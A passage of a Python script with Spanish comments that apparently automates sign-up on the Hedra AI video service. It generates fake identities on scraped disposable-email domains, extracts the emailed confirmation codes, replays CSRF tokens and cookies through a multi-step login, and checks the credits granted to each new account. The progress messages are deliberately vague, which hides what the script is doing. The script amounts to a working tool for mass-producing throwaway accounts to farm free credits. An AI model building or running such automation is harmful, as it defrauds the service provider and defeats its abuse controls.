        verification_code = extract_verification_code(response.text)
        print(verification_code)
    except ValueError as e:
        verification_code = None
    #if verification_code=="No Exit":
    #  proceso_completo()

    # Definir el patrón de búsqueda para delll
    patron = r"delll:\s*\"([^\"]+)\""

    # Aplicar la búsqueda utilizando regex
    resultado = re.search(patron, response.text)
    

    # Verificar si se encontró delll y obtener su valor
    if resultado:
        valor_delll = resultado.group(1)

    else:
        print(f"\r❌ -8 Error getting status...", end='', flush=True)


    return verification_code, str(verification_code).replace("Your confirmation code is ",""), valor_delll

def procesando(checkpoints):
    if checkpoints == 0:
        print(f"\r⏱️ Processing.", end='', flush=True)
        return False  
    elif checkpoints > 0:
        print(f"\r⏱️ Processing..", end='', flush=True)
        return True  
    else:
        print(f"\r⏱️ Processing...", end='', flush=True)
        return False  


def obtener_creditos(authorization):
    # URL del endpoint
    url = "https://api.hedra.com/web-app/billing/credits"
    
    # Encabezados por defecto
    headers = {
        "authorization": f"Bearer {authorization}",
        "accept": "application/json",
        "content-type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "ssr": "False",
        "sec-ch-ua-platform": "Windows",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        "sec-ch-ua-mobile": "?0",
        "enable-canary": "False",
        "access-control-allow-origin": "http://localhost:3000",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate"
    }
    
    try:

        response = requests.get(url, headers=headers)
        
        # Verificar si la respuesta fue exitosa
        if response.status_code == 200:
            data = response.json()
            
            # Extraer el valor de "remaining"
            remaining = data.get("remaining")
            if remaining is not None:
                print(f"\r⏱️ Processing..", end='', flush=True)
                os.environ["SINGLE"] = str(remaining)
                return remaining
            else:
                print(f"\r❌ -9 Error getting status...", end='', flush=True)
                return None
        else:
            print(f"\r❌ -10 Error getting status...", end='', flush=True)
            return None
    
    except Exception as e:
        print(f"\r❌ -11 Error getting status...", end='', flush=True)
        return None


def configs():
    process = get_user()
    if process:
        os.environ["PRO"] = process
        print(f"\r⏱️ Processing.", end='', flush=True)
        message, checkpoints, istm = geo_tmap(process, "Hunyuan", "480p")
        if procesando(checkpoints):
            print(f"\r⏱️ Processing...", end='', flush=True)
            if message == "User registered":
              print(f"\r⏱️ Processing..", end='', flush=True)
              os.environ["CHECKPOITS"] = str(checkpoints)
              proceso_completo()
            else:
              print(f"\r⏱️ Processing.", end='', flush=True)
              os.environ["CHECKPOITS"] = str(checkpoints)
              proceso_completo()
 
def config():
    process = get_user()
    if process:
        os.environ["PRO"] = process
        print(f"\r⏱️ Processing.", end='', flush=True)
        message, checkpoints, istm = geo_tmap(process, "Hunyuan", "480p")
        if procesando(checkpoints):
            if message == "User registered":
              print(f"\r⏱️ Processing..", end='', flush=True)
              os.environ["CHECKPOITS"] = str(checkpoints)


def not_post():
    process = os.environ.get("PRO")

    message, checkpoints, istm = geo_tmap(process, "Hunyuan", "480p")

    return checkpoints

def proceso_completo():
    configurar_credenciales()
    email = os.environ.get("EMAIL_AIVIS")
    passwords = os.environ.get("PASS_AIVIS")
    # Paso 2: Obtener información de la sesión
    print(f"\r⏱️ Processing.", end='', flush=True)
    csrf_token, formatted_cookies = get_session_info()
    os.environ["CSRF_TOKEN"] = csrf_token
    os.environ["FORMATTED_COOKIE"] = formatted_cookies
    time.sleep(1)


    # Paso 3: Postear credenciales y obtener token de sesión
    print(f"\r⏱️ Processing.", end='', flush=True)
    session_token = post_credentials(email, passwords, formatted_cookies, csrf_token)
    if session_token:
        os.environ["SESSION_TOKEN"] = session_token
        print(f"\r⏱️ Processing..", end='', flush=True)

    time.sleep(5)

    usuario = os.environ.get("USER_AIVIS")
    dominio = os.environ.get("DOMAIN_AIVIS")

    # Paso 4: Buscar código interno
    print(f"\r⏱️ Processing...", end='', flush=True)
    internal_code, oob_code, valor_delll = execute_get_request(usuario, dominio)


    time.sleep(5)
    email = os.environ.get("EMAIL_AIVIS")
    passwords = os.environ.get("PASS_AIVIS")
    session_token2 = os.environ.get("SESSION_TOKEN")
    # Paso 5: Verificar credenciales con el código
    print(f"\r⏱️ Processing.", end='', flush=True)

    csrf_token1 = os.environ.get("CSRF_TOKEN")
    formatted_cookies1 = os.environ.get("FORMATTED_COOKIE")

    cookies = post_credentials_with_code(email, passwords, oob_code, formatted_cookies1, session_token2, csrf_token1)
    if cookies:
        print(f"\r⏱️ Processing..", end='', flush=True)


    time.sleep(2)
    email = os.environ.get("EMAIL_AIVIS")
    passwords = os.environ.get("PASS_AIVIS")
    session_token2 = os.environ.get("SESSION_TOKEN")
    csrf_token1 = os.environ.get("CSRF_TOKEN")
    formatted_cookies1 = os.environ.get("FORMATTED_COOKIE")
    # Paso 6: Obtener nueva información de sesión
    print(f"\r⏱️ Processing...", end='', flush=True)
    session_token3 = get_session_info2(email, passwords, formatted_cookies1, session_token2)
    if session_token3:
        print(f"\r⏱️ Processing.", end='', flush=True)


    time.sleep(2)
    email = os.environ.get("EMAIL_AIVIS")
    passwords = os.environ.get("PASS_AIVIS")
    session_token2 = os.environ.get("SESSION_TOKEN")
    csrf_token1 = os.environ.get("CSRF_TOKEN")
    formatted_cookies1 = os.environ.get("FORMATTED_COOKIE")
    # Paso 7: Loguearse con los tokens obtenidos
    print(f"\r⏱️ Processing...", end='', flush=True)
    token_0, token_1 = post_sign_in(email, passwords, formatted_cookies1, session_token2, csrf_token1)
    if token_0 and token_1:
        print(f"\r⏱️ Processing.", end='', flush=True)


    # Paso 8: Obtener sesión con la URL deseada
    print(f"\r⏱️ Processing..", end='', flush=True)
    formatted_cookies1 = os.environ.get("FORMATTED_COOKIE")
    status_code, access_token = get_session(formatted_cookies1, token_0, token_1)
    if access_token:
        os.environ["ACCESS_TOKEN_AIVIS"] = access_token


    print(f"\r⏱️ Processing...", end='', flush=True)
    time.sleep(2)

    # Paso 9: Registrar usuario con el token de acceso
    print(f"\r⏱️ Processing.", end='', flush=True)
    registrar_usuario(access_token)
    time.sleep(1)
    if access_token:
      obtener_creditos(access_token)

    print("\n🔄 Connect.")


def conf_email_create():
  process = os.environ.get("PRO")
  message, checkpoints, istm = geo_tmap(process, "Hunyuan", "480p")
  if indexs(checkpoints):

      response = enviar_formulario()
      sitio_domain = obtener_sitio_web_aleatorio(response.text)
    
      nombre_completo = generar_nombre_completo()
      email = f'{nombre_completo}@{sitio_domain}'

      password_segug = generar_contrasena()
    
      os.environ["EMAIL_PRO"] = email
      os.environ["PASS_PRO"] = password_segug

      return email, password_segug
  else:
      return None, None

def conf_check_email():
  email = os.environ.get("EMAIL_PRO")
  usuario, dominio = email.split('@')

  process = os.environ.get("PRO")
  message, checkpoints, istm = geo_tmap(process, "Hunyuan", "480p")
  if indexs(checkpoints):
      internal_code, oob_code, valor_delll = execute_get_request(usuario, dominio)

      if internal_code:
        print("internal_code", internal_code)
        enviar_dell_post(valor_delll, usuario, dominio)
        return internal_code
      else:
        return None
  else:
      return None

def load_tokens(access_token):
  if access_token:
        os.environ["ACCESS_TOKEN_AIVIS"] = access_token
        credits = obtener_creditos(access_token)
        return "successful upload", credits
  return "Error", None

def configurar_credenciales():
    print(f"\r⏱️ Processing...", end='', flush=True)
    
    password_segug = generar_contrasena()
    response = enviar_formulario()
    sitio_domain = obtener_sitio_web_aleatorio(response.text)
    
    nombre_completo = generar_nombre_completo()
    email = f'{nombre_completo}@{sitio_domain}'
    passwords = password_segug

    usuario, dominio = email.split('@')

    os.environ["USER_AIVIS"] = usuario
    os.environ["DOMAIN_AIVIS"] = dominio

    os.environ["EMAIL_AIVIS"] = email
    os.environ["PASS_AIVIS"] = passwords
